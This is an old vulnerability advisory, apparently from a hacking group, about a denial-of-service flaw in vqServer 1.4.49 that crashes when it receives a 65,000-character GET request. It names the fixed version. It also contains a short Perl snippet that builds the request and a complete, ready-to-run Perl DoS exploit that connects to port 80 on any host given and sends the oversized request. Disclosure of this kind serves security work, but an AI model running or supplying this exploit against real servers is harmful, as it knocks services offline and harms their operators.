DHC Advisory
Advisory for vqServer 1.4.49
vqServer is made by vqSoft. Site: http://www.vqsoft.com
by nemesystm of the DHC
(http://dhcorp.cjb.net - auto45040@hushmail.com)

/-|=[explaination]=|-\
When sending vqServer version 1.4.49 a malformed URL request it will crash 
the service. This has been verified to work on the Windows version, but 
it probably is in the linux/unix version and prior versions too.

/-|=[testing it]=|-\
To test this vulnerability, send a GET request with 65000 characters.
So:
GET /AAA (hit return =)
Where AAA = 65000, seeing as Internet Explorer, nor Netscape lets you paste 
that much characters in their browser fields (www.server.com/AAA) you will 
have to use something like Telnet. 
You can easily program something to print 65000 chars in Perl:
open (OUT, ">$ARGV[0]");
print OUT ("GET /");
print OUT ("A" x 65000);
then it's just a cut and paste.
Or you can use the example code below

/-|=[fix]=|-\
the latest edition of vqServer (1.9.47) is unaffected by this. It is available 
for download at www.vqsoft.com

/-|=[notes]=|-\
PUT, POST and the Administration port do not seem to be affected by a high 
amount of characters. The Windows version needed a reinstall every five 
or so crashes. A reboot or total shutdown did not help. 

/-|=[exploit code]=|-\
sinfony quickly wrote some code so you can see if you're vulnerable.

#!/usr/bin/perl 
# DoS exploit for vqServer 1.4.49 
# This vulnerability was discovered by nemesystm 
# (auto45040@hushmail.com)
#
# code by: sinfony    (chinesef00d@hotmail.com) 
# [confess.sins.labs] (http://www.ro0t.nu/csl) 
# and DHC member	    
#
# kiddie quote of the year:
# <gammbitr> dude piffy stfu i bet you don't even know how to exploit it 

die "vqServer 1.4.49 DoS by sinfony (chinesef00d\@hotmail.com)\n
usage: $0 <host> \n" 
if $#ARGV != 0; 

use IO::Socket;

$host = $ARGV[0];
$port = 80;

print "Connecting to $host on port $port...\n"; 
$suck = IO::Socket::INET->
	new(Proto=>"tcp", 
	PeerAddr=>$host,
	PeerPort=>$port)
	|| die "$host isnt a webserver you schmuck.\n"; 

$a = A;
$send = $a x 65000;
	print "Connected, sending exploit.\n";
	print $suck "GET /$send\n"; 
sleep(3); 
	print "Exploit sent. vqServer should be dead.\n";
close($suck)